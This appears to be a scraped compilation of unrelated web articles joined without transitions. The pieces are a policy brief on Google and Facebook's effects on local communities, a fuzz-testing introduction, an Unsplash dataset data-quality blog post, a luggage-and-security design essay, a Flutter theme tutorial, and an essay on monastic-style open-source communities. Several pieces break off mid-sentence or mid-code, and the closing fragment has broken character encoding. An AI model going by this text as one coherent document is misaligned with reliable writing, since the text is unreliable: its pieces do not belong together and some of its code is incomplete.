<p>This policy brief will examine Google and Facebook’s effects on local communities in two ways. First, it will examine the impacts of their product lines: How their search and social networking services affect local communities through their organizing of advertising markets and the viability of local journalism. Second, it will explore more direct political strategies by these corporations to extract subsidies from local communities, and how they hide what they are doing from voters. These are surely not the only harms the corporations inflict on local communities, merely some of the most egregious.</p>
<p>Finally, it will detail solutions – at both the federal and local level – to readjust the legal underpinning of the platform business model, so that Facebook and Google’s strategies of self-preferencing to exclude competitors and profiting via misinformation are no longer viable, and so that local communities can prioritize small businesses and local services over the business imperatives of these extractive giants.</p>
<h3><strong>What Are Facebook and Google?</strong></h3>
<p>Popularly portrayed as big tech companies, Facebook and Google – and the other properties they own, such as WhatsApp and YouTube, respectively – are better understood as vital 21<sup>st</sup> century communications networks.<a href="#_ftn15" name="_ftnref15">[15]</a> They’re the platforms on which local shops and restaurants connect to customers, on which local news is disseminated, and on which citizens organize everything from school bake sales to local elections to neighborhood clean-ups.</p>
<p>But their business models are not based on serving consumers with the most credible information and facilitating neutral communications among friends, family, and community stakeholders. Instead, Facebook and Google use intrusive surveillance of their users to collect data, and they use algorithms based on “engagement” to ensure users continue to pay attention to curated content. They then sell user attention, enriched with data, to advertisers, often monetizing content they didn’t generate but are profiting from, with users manipulated into further engagement with their properties. Both companies have incentives to self-deal and self-preference their own content in order to capture market share, and then use engagement algorithms to sell more advertising.<a href="#_ftn16" name="_ftnref16">[16]</a></p>
<blockquote><p>Good information isn’t what Facebook and Google are selling. You are being sold to advertisers through what you see and interact with.</p></blockquote>
<p>As tech reporter Rani Molla put it, “This business model has been around for decades, and it shows how free software (not to be confused with the free software movement) and services are never really free. You’re paying with your data.”<a href="#_ftn17" name="_ftnref17">[17]</a></p>
<h3><strong>How Dominant Search and Social Networks Affect Local Communities</strong></h3>
<h4><strong>Google Undermines Local Businesses: </strong></h4>
<p>For a local business to operate and be successful, local residents must be able to find it. There’s a long history of enabling such matchmaking between customers and businesses through newspapers, radio, TV, directories, and local advertising channels. Today, one of the key mechanisms filling this critical function is local search. Local search is the single largest category of search on Google, the world’s dominant search engine. In 2018, Google said local search grew by 50 percent over the year before, outpacing the overall search market.<a href="#_ftn18" name="_ftnref18">[18]</a> More than 80 percent of cell phone users report searching for businesses “near me.”<a href="#_ftn19" name="_ftnref19">[19]</a></p>
<p>And yet, Google’s search properties, either general search or via its Maps subsidiary, often hurt local businesses and residents by allowing scammers to infiltrate its listings. For instance, Florida locksmith Rafael Martorell explained that the name of his business, A-Atlantic Lock and Key, was stolen by scammers on Google who pretended to be him and would charge customers five or six times what he normally charged. “One of the scammers put the name of my company, and the address that he put was my own house,” he said, alleging that such practices are an epidemic in the locksmith industry.<a href="#_ftn20" name="_ftnref20">[20]</a></p>
<p>“90 percent of our advertising, most of that for years was the Yellow Pages,” Martorell said. “Then suddenly Google came, without us noticing. And then we figured it out, we knew we had to go to Google and that is when the issues began. Because the local listings, most of them are fraudulent. Completely phony, fraudulent.”<a href="#_ftn21" name="_ftnref21">[21]</a> The <em>Wall Street Journal</em> noted several other sectors in which similar scams have occurred.<a href="#_ftn22" name="_ftnref22">[22]</a></p>
<p>Since Google is so dominant in search, merchants have little alternative to battling the corporation endlessly, trying to buy ads for which they can’t ascertain the true value – and where a substantial amount of clicks can be fraudulent<a href="#_ftn23" name="_ftnref23">[23]</a> – or simply vanishing from the vast majority of internet searches when they are either not listed or when their listing has incorrect information. (Facebook can create similar issues for small businesses via fraud, driving up costs for businesses running ads and opaque algorithm changes that limit small businesses ability to ensure their customers actually see their content.)<a href="#_ftn24" name="_ftnref24">[24]</a><a href="#_ftn25" name="_ftnref25">[25]</a></p>
<p>Google’s size and scale leads to neglect of local needs. The corporation has eight products with more than a billion users, so the ability of a top executive to focus on any one town, or even a major city, is virtually nil. Google is slow to correct misinformation and has allowed whole neighborhoods to be …</p></div></div></div></div></div>

<p>For those who are unfamiliar with the term or practice of <strong><em>Fuzz Testing</em></strong>, it’s essentially the combination of testing input validation coupled with stress testing, which is performed by spraying inputs of a target device, application, or system with random and crafted input at high velocity and observing the effects on the target. Use cases can involve testing input forms on a website to ensure it doesn’t accept foreign or script characters or ensuring that IIoT devices are programmed to be functionally robust.</p>



<p>I’ve performed fuzz testing for many web &amp; mobile applications, and even industrial networks and devices. There are common denominators amongst fuzz tests of different technology or hardware stacks that map to higher level processes that translate well across the board and can be universally applied. Many fuzzing frameworks claim to be unified, but are only such when employed in their respective technology silo(s). As someone who works simultaneously in very low <em>and</em> high levels of varying engagements, I tend never to work, research, or experiment in a vacuum. And so the thought of having to find and apply fuzzing frameworks <em>a la carte</em> aggravates the living shit out of me, as It’s an inefficient and misapplied expenditure of effort (i.e. a waste of time).</p>



<p>I wanted to provide something of value that others who need to perform fuzz testing of <em>anything</em> can use from front-to-end, and even build off + flesh out as seen fit by those planning and/or testing. I just wanted to make your life easier. Enjoy!!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  
  <article>
    

<p>This is the 3rd in an open-ended series around implementing roughly the same application in many ways using various technologies, frameworks, languages etc. Feel free to <a href="https://dojo4.com/blog/try-them-all-introduction">start at the beginning</a>.</p>

<p>In the <a href="https://dojo4.com/blog/try-them-all-dataset-selection">previous article</a> I decided  to use the <a href="https://unsplash.com/data">Unsplash Dataset</a> as the basis for these implementations and enhance it with the data from <a href="https://www.geonames.org/">GeoNames</a> and <a href="https://gadm.org/">GADM</a>.</p>

<p>Today I'm going to explore the data of the Unsplash dataset from a data quality perspective. I want to check things out about the data that could trip me up down the road if I don't catch them now.</p>

<h2>Fetching and loading the Unsplash data</h2>

<p>This process is all derived from the documentation in the <a href="https://github.com/unsplash/datasets">Unsplash datasets github repository</a>.</p>

<ol>
<li>Make a scratch directory.
<code>mkdir unsplash &amp;&amp; cd unsplash</code></li>
<li>Download the dataset.
<code>curl -L https://unsplash.com/data/lite/latest -# -o unsplash-research-dataset-lite-latest.zip</code></li>
<li>Extract the files
<code>unzip unsplash-research-dataset-lite-latest.zip</code></li>
<li>Quick check on sizes
  <code>
  % wc -l *.tsv000
   1646598 collections.tsv000
   4075505 conversions.tsv000
   2689741 keywords.tsv000
     25001 photos.tsv000
   8436845 total
</code></li>
<li>Download the creation and loading scripts mentioned in <a href="https://github.com/unsplash/datasets/blob/master/how-to/psql/README.md">Loading data in PostgreSQL</a>.
<code>
curl -L -O https://raw.githubusercontent.com/unsplash/datasets/master/how-to/psql/create_tables.sql
curl -L -O https://raw.githubusercontent.com/unsplash/datasets/master/how-to/psql/load-data-client.sql
</code></li>
<li>Create the postgresql db - this does assume you have a postgresql server up and running locally. You'll probably need to adjust the commandline as appropriate for your situation.
<code>createdb -h localhost unsplash_lite</code></li>
<li>Create the tables.
<code>
% psql -U jeremy  -d unsplash_lite -f create_tables.sql
CREATE TABLE
CREATE TABLE
CREATE TABLE
CREATE TABLE
</code></li>
<li>Edit the <code>load-data-client.sql</code> file to replace the <code>{path}</code> section to the full path to the unsplash scratch directory you are in.</li>
<li>Load the data - the numbers output should be 1 less than those  in the <code>wc -l</code> check from Step 4 above. That's because of header lines on all the files. This will probably take a few minutes.
<code>
% time psql -h localhost -U jeremy -d unsplash_lite -f load-data-client.sql
COPY 25000
COPY 2689739 # Hmm.. this one is NOT 1 less than keywords.tsv000 above - will have to investigate
COPY 1646597
COPY 4075504
real    1m48.452s
user    0m57.944s
sys     0m2.320s
</code></li>
</ol>

<h2>Data Quality Checks</h2>

<p>It is always a good idea when you start looking at a dataset to do some cursory data quality checks and see if anything jumps out.</p>

<p>All of the following assume you are at the <code>psql</code> commandline. So connect up: <code>psql -U jeremy -h localhost unplash_lite</code></p>

<h3>Check Referential Integrity</h3>

<p>According to the <a href="https://github.com/unsplash/datasets/blob/master/DOCS.md">dataset documentation</a> the <code>photo_id</code> column on the <code>unsplash_photos.photo_id</code> field is the primary key of all the photos, and the <code>photo_id</code> column in the other tables should refer to the photos table. The <a href="https://github.com/unsplash/datasets/blob/master/how-to/psql/create_tables.sql">create_tables.sql</a> does not create the referential constraint - or indexes on these columns. Lets add those. Doing so will confirm the documented referential integrity.</p>

<pre><code>unsplash_lite=# alter table unsplash_collections add foreign key (photo_id) references unsplash_photos(photo_id);
ALTER TABLE
unsplash_lite=# alter table unsplash_conversions add foreign key (photo_id) references unsplash_photos(photo_id);
ALTER TABLE
unsplash_lite=# alter table unsplash_keywords add foreign key (photo_id) references unsplash_photos(photo_id);
ALTER TABLE
</code></pre>

<p>No errors. Excellent, this confirms the documented referential integrity.</p>

<p>Just to save our sanity while doing some exploring - lets go ahead and add indexes on those foreign key columns. No need to add one for <code>unsplash_collections</code> as it is part of the compound primary key.</p>

<pre><code>unsplash_lite=# create index on unsplash_conversions(photo_id);
CREATE INDEX
unsplash_lite=# create index on unsplash_keywords(photo_id);
CREATE INDEX
</code></pre>

<h3>Cardinality check</h3>

<p>One of the first things I do when looking at a new set of data is check out the cardinality of the columns. In other words, the list of distinct values in the column. This can show you potential errors or just undocumented assumptions in the dataset.</p>

<p>You could use a tool like <a href="https://github.com/BurntSushi/xsv">xsv</a> to do an initial cardinality report. <code>xsv stats --cardinality -d '\t' photos.tsv000  | xsv table</code> will work.</p>

<p>I'm going with an SQL approach today. Doing a cardinality check is effectively doing a group count on all the values of a column. This query on <code>unsplash_photos.photo_featured</code> for example.</p>

<pre><code>unslash_lite=# select photo_featured, count(*) from unsplash_photos group by 1;
 photo_featured | count
----------------+-------
 t              | 25000
(1 row) 
</code></pre>

<p>This shows that the <code>unsplash_photos.photo_featured</code> field has the value<code>true</code> for every record in the dataset. A cardinality of 1. When a column has a cardinality of 1, it is always <a href="https://github.com/unsplash/datasets/issues/25">worth confirming</a> that this cardinality is correct. In this case <a href="https://github.com/unsplash/datasets/issues/25#issuecomment-677794892">this is expected</a>.</p>

<blockquote>
<p>It is expected that all the photos in the Lite dataset are featured photos. It won't be the case in the Full dataset
-- <a href="https://github.com/unsplash/datasets/issues/25#issuecomment-677794892">@TimmyCarbone</a></p>
</blockquote>

<p>The first version of the Unsplash dataset I downloaded was the initial release. And when I did cardinality checks on the various <code>unsplash_photos.ai_primary_landmark_*</code> columns, they all had a cardinality of 1, with the value <code>NULL</code>. <a href="https://github.com/unsplash/datasets/issues/12">I asked about this</a>. And it turned out to be a bug, was fixed, and a new release of the dataset was published.</p>

<p>So always worth worth asking questions. Initial clarifications can save hours, days, weeks, even months of person time to find, fix, and reprocess incorrect data assumptions.</p>

<h3>Check for leading and trailing whitespace on text fields.</h3>

<p>Looking at the <code>unsplash_keywords</code> table, there is a <code>keyword</code> column. If the values in this column are from human entered data, in all probability it will be a bit messy. For instance, do any of the keywords have leading or trailing spaces?</p>

<pre><code>unsplash_lite=# select count(*) from unsplash_keywords where keyword like ' %';
 count
-------
  1248

unsplash_lite=# select count(*) from unsplash_keywords where keyword like '% ';
 count
-------
   291
</code></pre>

<p>That could be an issue -- lets see if there's any any keywords that are just padded left or right with spaces.</p>

<pre><code>unsplash_lite=# select keyword, count(*)  from unsplash_keywords where keyword like '% ' group by 1 order by 2 desc limit 5;
     keyword      | count
------------------+-------
 wallpaper        |     5
 california       |     5
 cat photography  |     4
 beautiful        |     4
  silhouette      |     3

unsplash_lite=# select '&gt;' || keyword || '&lt;' as keyword, count(*) from unsplash_keywords where keyword IN (' wallpaper', 'wallpaper', 'wallpaper ') group by 1 order by 2 desc;
   keyword    | count
--------------+-------
 &gt;wallpaper&lt;  |  1951
 &gt; wallpaper&lt; |    12
 &gt;wallpaper &lt; |     5
</code></pre>

<p><em>That || operator is the SQL string concatenation operator, its used here to visually show the padding.</em></p>

<p>Yup -- looks like there might be something to this -- <a href="https://github.com/unsplash/datasets/issues/13">I asked Unsplash about it</a>. There's a whole lot of text fields in the Unsplash data, and like I said, humans never enter data consistently. Turns out this is a known factor in this dataset and <a href="https://github.com/unsplash/datasets/issues/13#issuecomment-672635482">they are are open to community input</a>:</p>

<blockquote>
<p>I believe that having clean fields is important. We might and will probably get to normalizing the location fields at some point in the future, it's just not really planned yet. I'll keep you and everyone posted on this issue as soon as we have a plan to tackle it</p>

<p>Also, if anyone wants to give it a shot, we'd be happy to implement good solutions from the open-source community!</p>

<p>-- @TimmyCarbone</p>
</blockquote>

<p>That <a href="https://github.com/unsplash/datasets/issues/13">issue is open</a> and there are a number of other text columns exhibiting the same characteristics as <code>unsplash_keywords.keyword</code>. It is being kept open for future reference.</p>

<h3>How about if the keywords are normalized on case?</h3>

<pre><code>unsplash_lite=# select count(*) from unsplash_keywords where keyword != lower(keyword);
 count
-------
     0
</code></pre>

<p>Okay - that looks good. Nothing to see here, move along.</p>

<h3>That 1 line difference on keywords from the import</h3>

<p>When looking at the original <code>keywords.tsv000</code> file, it has 2,689,741 rows, which I assumed to be 1 header row and 2,689,740 data rows. When imported, postgresql reported 2,689,739 rows. This does not match my assumption. Lets double check and figure this out.</p>

<pre><code>% wc -l keywords.tsv000
2689741 keywords.tsv000
</code></pre>

<pre><code>unsplash_lite=# select count(*) from unsplash_keywords ;
  count
---------
 2689739
(1 row)
</code></pre>

<p>Still a row off, maybe there's an extra newline in <code>keywords.tsv000</code>?

<p>Nope. Well, maybe there was a row eliminated on import. In the <a href="https://github.com/unsplash/datasets/blob/master/how-to/psql/create_tables.sql">create_tables.sql</a> the primary key on the <code>unsplash_keywords</code> table is a compound key of <code>photo_id</code> and <code>keyword</code>.</p>

<pre><code>CREATE TABLE unsplash_keywords (
  photo_id varchar(11),
  keyword text,
  ai_service_1_confidence float,
  ai_service_2_confidence float,
  suggested_by_user boolean,
  PRIMARY KEY (photo_id, keyword)
);
</code></pre>

<p>How about reimporting this data file and see how it looks. Using a new table, that's just like the original one but without the primary key and then import the keywords tsv into it. The <code>\COPY</code> command here is adapted from <a href="https://github.com/unsplash/datasets/blob/master/how-to/psql/load-data-client.sql">load-data-client.sql</a></p>

<pre><code>unsplash_light# CREATE TABLE unsplash_keywords_raw ( photo_id varchar(11), keyword text, ai_service_1_confidence float, ai_service_2_confidence float, suggested_by_user boolean
CREATE TABLE
unsplash_light# \COPY unsplash_keywords_raw FROM PROGRAM 'awk FNR-1 ./keywords.tsv* | cat' WITH ( FORMAT csv, DELIMITER E'\t', HEADER false);
COPY 2689739
</code></pre>

<p>No joy, same as before. Looks like its time to <a href="https://gist.github.com/copiousfreetime/ab23addcb3a6e5612a77d0724e5d52b9">write code</a>. The checks to do are:</p>

<ul>
<li>make sure that all the records have the same number of fields</li>
<li>the number of records in the file matches that reported by <code>wc -l</code> and/or loaded by postgresl</li>
</ul>

<p>My primary programming language is Ruby - so I'll use it.</p>

<pre><code>#!/usr/bin/env ruby

line_number    = 0
unique_counts  = Hash.new(0)
filename       = ARGV.shift
abort "filename needed" unless filename

File.open(filename) do |f|

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						
<p>We landed a man on the moon before we had wheeled suitcases. Wait. I’ll do one better. We were orbiting space shuttles before we had wheeled suitcases. I heard this fact years ago and it blew me away. I asked, why?</p>



<p>It took an inside guy solving his problem his way. Picture modern travel luggage. Wheels on the bottom, telescoping handle on the top, right? Robert Plath invented this in 1987 in outside of his day job as a Northwest Airlines pilot. (<a href="https://pdfpiw.uspto.gov/.piw?PageNum=0&amp;docid=04995487&amp;IDKey=5E643CD19316&amp;HomeUrl=%2F">United States patent 4,995,487</a>, if you’re interested.) It was a classic garage inventor success story. Plath developed and tested the prototypes, the idea took off, and he founded <a href="https://travelpro.com/pages/our-history">Travelpro</a> and began selling the suitcases under the label Rollaboard.</p>



<p>The first design lesson: the person doing the job is the right person to ask about how to improve the job. Good security is usable security.</p>



<p>A while back, I was consulting on a privileged access management (PAM) security capability. The security objective was that all administration be performed from a dedicated laptop, using a separate credentials, through sessions that were monitored and recorded. Try selling that level of control, that level of friction, and that level of change to the administrators. Yeah. Good luck with that approach.</p>



<p>Instead, we found the Robert Plath of systems administration. Instead of pitching security, we asked him how heavy his bags were to carry. The team approached PAM as an admin productivity project. Wheels on bottom. Telescoping handle on top. The resulting privileged access workstations (PAWs) reduced access time and simplified systems administration tasks. While the PAM controls added friction, due to the insights and efforts of Plath the systems admin, these were offset by time savings. This is the inside edge that collaboration can bring.</p>



<p>Returning to the actual Robert Plath, there’s one more lesson in designing capabilities. Surely, you must be thinking, other people thought to add wheels to suitcases in the first six decades of commercial air travel. You’re right. Bernard Sadow came up with a design decades before Plath. (<a href="https://pdfpiw.uspto.gov/.piw?PageNum=0&amp;docid=03653474&amp;IDKey=90004F7739F5&amp;HomeUrl=%2F">United States patent 3,653,474</a>, again, if you’re interested.) It’s effectively a traditional suitcase with castors on one side. I have one. Let’s just say it isn’t the easiest luggage to use. But that wasn’t the main problem. Adoption and culture was.</p>



<p>Bernard Sadow made luggage. Robert Plath flew planes. Sadow had to sell into the market. This ran into cultural issues because, back then, one sure way to show your strength as a man was to carry luggage. Plath simply handed out his prototypes to flight crews. Not only was Plath’s luggage better, suddenly, it was the cool kids’ luggage. In other words, <a href="https://jwgoerlich.com/ray-bans-over-safety-goggles-design-monday/">Sadow pitched safety glasses and Plath offered Ray-Bans</a>.</p>



<p>The final design lesson is planning for adoption is planning for success. Good security takes flight when widely adopted.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1574010431838/5PheDhfJx.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>One of the trending concepts in the mobile application is the ability to have multiple themes such as light and dark themes, and you can have as many themes as possible in your application. the question right now is how to manage the theme in order to cut across all pages. thinking about managing the state of your theme in the application. one of the ways of managing the state is using stateful widget which is a terrible approach and it's inefficient and the other approach is to use statement package, there are a lot of statement management packages in flutter such as Providers, BLOC, Redux, Mobx e.t.c in this article I will be chosen provider state management package.</p>

<p>using a state management package allows you to manage your state globally in your application, it is more like having a global store where each page, widgets can connect directly to and access and manipulate data.</p>
<h3 id="steps-">Steps:</h3>
<ol>
<li>How to install Provider Package
add below snippet in your pubspec.yml file under the dependencies  section</li>
</ol>
<pre><code><span>provider</span>: ^3<span>.1</span><span>.0</span>+1
</code></pre><p>OR</p>
<pre><code>
provider:
</code></pre><p>2.
create a dart file that has all your theme definition</p>
<pre><code>

ThemeData darkTheme = ThemeData.dark().copyWith(
    primaryColor: Color(<span>0xff1f655d</span>),
    accentColor: Color(<span>0xff40bf</span>7a),
    textTheme: TextTheme(
        title: TextStyle(color: Color(<span>0xff40bf</span>7a)),
        subtitle: TextStyle(color: Colors.white),
        subhead: TextStyle(color: Color(<span>0xff40bf</span>7a))),
    appBarTheme: AppBarTheme(color: Color(<span>0xff1f655d</span>)));

ThemeData lightTheme = ThemeData.light().copyWith(
    primaryColor: Color(<span>0xfff5f5f</span>5),
    accentColor: Color(<span>0xff40bf</span>7a),
    textTheme: TextTheme(
        title: TextStyle(color: Colors.black54),
        subtitle: TextStyle(color: Colors.grey),
        subhead: TextStyle(color: Colors.white)),
    appBarTheme: AppBarTheme(
        color: Color(<span>0xff1f655d</span>),
        actionsIconTheme: IconThemeData(color: Colors.white)));
</code></pre><p>3.
Create a theme model </p>
<p>you need to create your theme model</p>
<pre><code><span>import</span> <span>'package:flutter/material.dart'</span>;
<span>import</span> <span>'package:whatsapp/theme.dart'</span>;

<span>enum</span> ThemeType { Light, Dark }

<span><span>class</span> <span>ThemeModel</span> <span>extends</span> <span>ChangeNotifier</span> </span>{
  ThemeData currentTheme = darkTheme;
  ThemeType _themeType = ThemeType.Dark;

  toggleTheme() {
    <span>if</span> (_themeType == ThemeType.Dark) {
      currentTheme = lightTheme;
      _themeType = ThemeType.Light;
      <span>return</span> notifyListeners();
    }

    <span>if</span> (_themeType == ThemeType.Light) {
      currentTheme = darkTheme;
      _themeType = ThemeType.Dark;
      <span>return</span> notifyListeners();
    }
  }
}
</code></pre><p>Explanation:</p>
<ul>
<li><p>we are creating an enum type for our theme, which we allow us to assign a type to each Themedata, it also helps us to check currently theme efficiently</p>
</li>
<li><p>We create a class that extends ChangeNotifier, create currentTheme as a property of ThemeData and set the default value to darkTheme and also property _themeType  then assign your current themeType to it. you can set any theme of your choice, it's the theme that will be the default app theme</p>
</li>
<li><p>create a method that handles the toggling of your theme from theme 1 to theme 2. But the most important part is to call notifyListener() method, it is the method that informs your store that your state value has changed.</p>
</li>
</ul>
<p>Wrap provider Class as a parent of your MaterialApp, which will allow all pages, widgets e.t.c have access to the provider value.</p>
<pre><code><span>void</span> main() =&gt; runApp(
ChangeNotifierProvider&lt;ThemeModel&gt;(
    builder: <span>(<span>BuildContext context</span>) =&gt;</span> ThemeModel(), child: MyApp()));
</code></pre><p>Consuming your state value anywhere in your application</p>
<pre><code>Provider.of&lt;<span>object</span>&gt;(context);
</code></pre><p>it allows you to access your provider store value and access your data. by specifying the ThemeModel.</p>
<p>below is your output</p>
<pre><code><span><span>class</span> <span>MyApp</span> <span>extends</span> <span>StatelessWidget</span> {</span>
  @override
  Widget build(BuildContext context) {
    <span>return</span> MaterialApp(
      debugShowCheckedModeBanner: <span>false</span>,
      title: <span>'Flutter Demo'</span>,
      theme: Provider.<span>of</span>&lt;ThemeModel&gt;(context).currentTheme,
      home: MyHomePage(title: <span>'WhatsApp'</span>),
    );
  }
}
</code></pre><p>Finally, Adding toggle widget to your app, this is the widget that will eneable you to switch from theme 1 to theme 2 and vice-versa. for the sake of simplicity of the article, I will just add a RaisedButton widget to MyHomePage Screen. 
snippet below</p>
<pre><code><span><span>class</span> <span>MyHomePage</span> <span>extends</span> <span>StatelessWidget</span>
</span>{
<span>final</span> String title;

MyHomePage({<span>this</span>.title});

<span>Widget <span>build</span><span>(BuildContext context)</span></span>{
 <span>return</span> Scaffold(
     appBar: AppBar(
     title: Text(widget.title)),
     body: Center(
child:RaisedButton(child: Text(<span>"Change Theme"</span>,
 onpressed:(){
Provider.of&lt;ThemeModel&gt;(context).toggleTheme();
}
))
);
}

}
</code></pre><p><strong><em>NB:</em>
</strong> <em>Provider.of&lt;ThemeModel&gt;(context).toggleTheme(); </em> allows you to connect to your themeModel class and run toggleTheme() method.</p>

<p>The main purpose of this article is to allow you, to have an understanding of how you can create your own multi-based flutter applications using Providers State management package.</p>

<![CDATA[The Intersection of Hard, Important, and Profitless Problems]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
            <div>
              <p>The recent announcement from Mozilla Corporation that it is laying off almost a quarter of its work force has many, including myself, thinking about how we as a society go about ensuring the continued existence of the fundamental digital infrastructure on which so much of modern life depends. The continued funding of open source software, and therefore its long-term sustainability, has been a perennial question for developers, the for-profit companies that rely on open source libraries, and even some of the large <a href="https://www.fordfoundation.org/about/library/reports-and-studies/roads-and-bridges-the-unseen-labor-behind-our-digital-infrastructure">philanthropic foundations</a>. There don’t seem to be any silver bullets to solve the problem, but the software produced by these projects can be massively important. We’ve seen time and again how just a handful of unpaid people can be responsible for complex pieces of code that are fundamental to the continued operation of our global network. The funding story gets even worse if you look at the need to maintain software instead of develop something new.</p>
<p>On top of that, our relationship with our electronics has always been tinged by the background issues of how they’re made, how quickly we are convinced to replace them, and, frankly speaking, their human and ecological costs. The online services that we connect to using those devices have their own problems, from privacy violations to radicalization, all in service to (or an outgrowth of) keeping us glued to our screens so companies can sell more advertising.</p>
<p>It seems like there should be solutions to both of these (and some other) issues. A way to support the necessary work on important infrastructure as well as divorcing our own use of technology from the incessant needs of capitalism.</p>
<p>There have always been groups of people willing to dedicate themselves to what they view as fundamental in life, without concern for what profit it brought. What if there existed a model for an <a href="https://en.wikipedia.org/wiki/Intentional_community">intentional community</a> where this type of work could be done? The course of 2020, from pandemic, to the battle for civil rights, to uprisings against dictatorships in Belarus, Hong Kong, and Thailand, has tought us the importance of solidarity, of the power of community, and the need to think beyond the well-trod paths of the 20th Century. So, how could a new type of intentional community, focused on building and maintaining technology to help real people as well as our planet, operate? How would it sustain itself against the backdrop of a capitalist world?</p>
<h2 id="monasteries">Monasteries</h2>
<p>There are, of course, some analogs to this kind of community, both ancient and modern. The Christian monasteries of the late Classical and Middle Ages are one example. The dedication to the church and its teachings gave the members of the monestary the drive to remove themselves from everyday life and pursue what they felt was a higher calling. They were not generally completely separate from society, however. Monks and nuns taught the laity not just religion but also agriculture, mechanics, and metallurgy. They were also responsible for the diligent copying and storage of manuscripts, eventually giving later thinkers the opportunity to read copies of ancient Roman and Greek texts. Monasteries and cathedrals also often offered the only meaningful schooling of the time.</p>
<p>The monasteries themselves were supported by the laity by donations and via the larger Church structure. Some monestaries also produced their own products for sale to the public. The two groups relied to a certain extent on one another. This reciprocal relationship of donations given by the public and knowledge and care given by the monastics in return still sustains the monasteries of today.</p>
<p>The monestary model of course shows up in other cultures as well, such as in Buddhism. The Buddhist model shows a similar symbiotic relationship between monastics and the laity. In fact, monks and nuns are forbidden from growing their own food and must go into their communities to collect donations of food. This binds them to the surrounding people and ensures that they do not retreat and seal themselves off. In return, of course, the monastics provide education and spiritual guidance to the public.</p>
<h2 id="a-shift-of-priorities">A Shift of Priorities</h2>
<p>Religion as a motivating factor is less of a driving force today, but perhaps the drive to improve the lives of people and the planet can still be captured.</p>
<p>Could some of the issues facing the open source movement in particular and the world more broadly be addressed and perhaps alleviated by a reimagined version of that same kind of intentional living and reciprocal support structure? We can combine elements of monastic living with the tenets of open source, communal solidarity, and ecological care, to create a new model for living with technology and the environment. I don’t have a name I like yet (suggestions welcome!), but I’m rolling with “a Dedication” for now. Here are some thoughts on how a Dedication could operate:</p>
<h3 id="fundamentally-important-focuses">Fundamentally Important Focuses</h3>
<p>While of course individual Dedicateds will always have their own passions to pursue, the overriding focus and mission of the Dedications should be centered around a central core of priorities:</p>
<ul>
<li>Crucial and under-supported digital infrastructure on which many people rely</li>
<li>Tools that empower the people that work with them, particularly in cases where those people belong to marginalized communities, instead of huge corporations</li>
<li>Objects and ideas that are designed to operate on long time scales – This means avoiding planned obsolescence, designing for easy repair, and not fetishizing other goals such as speed or size over resilience and longevity</li>
<li>Outcomes that benefit local communities first, rather than trying to solve the problems of a global audience</li>
</ul>
<h3 id="self-sufficiency-and-helping-local-communities">Self Sufficiency and Helping Local Communities</h3>
<p>In addition to support from local and other communities, a Dedication can and should do what it can to be self sufficient:</p>
<ul>
<li>Grow what food it can given the physical location it occupies</li>
<li>Accept donations in return for things they produce or services they provide (e.g. organizations like <a href="https://www.edinburghremakery.org.uk/">Edinburgh Remakery</a>)</li>
<li>Limit the impact on the Earth that the group has by reusing whenever possible, offsetting electricity use by using more efficient equipment and installing solar, wind, and other renewable electrical sources</li>
</ul>

<p>The COVID pandemic makes this suggestion an odd one, but hopefully some day we will be able to go outside and see other people again… While the bulk of open source development happens online, there are some clear benefits that come from gathering together. I think a solitary modern monastic could constitute a Dedication-of-one located in an apartment above a coffeeshop, but they would miss out on some of these benefits:</p>
<ul>
<li>Costs of all necessities fall when you purchase in bulk. Food, rent, clothing, furniture, and most other items can be had cheaper when you’re buying for 20 instead of one.</li>
<li>Groups of larger numbers are more likely to engage in activities, both in the open source ecosystem and in the local community, that would be likely to garner support through donations of money, equipment, or time.</li>
<li>The work of coding obviously benefits from bouncing ideas off of others. While the internet makes distance collaboration much easier, there is still a tangible benefit to sharing space with colleagues.</li>
</ul>
<h3 id="a-common-outfit">A Common Outfit</h3>
<p>There are a few reasons why Dedicateds should stand out wherever they go. As with monastics of every tradition, Dedicateds should remind everyone around them of the work that they’re doing and the commitment that they have made. They are ambassadors of the entire idea.</p>
<p>It should be as simple as a robe of a given color. In my head green makes the most sense. The color is a reminder of the goal to heal the planet, and green is said to cause feelings of safety and calm. The robe form is important for all the reasons that it was 500 BCE when the Buddha chose it: it is easy to create, inexpensive to obtain, easy to repair, and simple to hand down to another. It is also conveniently non-gender specific. It therefore represents the ideals of reuse, simplicity, and equity that would underly the work of the Dedication.</p>
<h2 id="so-what">So What?</h2>
<p>I’m not running off tomorrow to start some commune. This is 90% “what if” ideas that have been bouncing around in the back of my head for a while. But there is still that 10%…</p>
<p>This is also obviously not the only way to support people working on these important but profit-less projects. There have been some success stories of people making enough of a living off of individual grants, Patreon supporters, or GitHub’s new “Sponsors” program to work on open source as a full time job. I’m not sure that these solutions really scale to more than a handful (relatively speaking) of people, and they don’t really address the issues of our technology’s impacts on ourselves and our planet.</p>
<p>Clearly, nothing in here is even a quarter fleshed out. I’d love to hear from people who are into the idea or think its completely bonkers, as long as they’re cool about it. You can reach out to me <a href="https://twitter.com/RossSchulman">on Twitter</a>, <a href="https://social.rbs.io/@ross">on Mastodon</a>, or <a href="https://matrix.to/#/@rschulman:westwork.org">on Matrix</a>.</p>

    <a href="https://outlandishthinking.com/">Outlandish Thinking</a>

<p>Thereâ€™s free speech and the question of free will, but lately Iâ€™ve been wondering how free our thoughts are. And Iâ€™m pretty sure theyâ€™re not free to roam wherever they may like, but constrained by unseen guardrails and self-censoring mechanisms that arrest the development of interesting ideas before they can be fully articulated.</p>

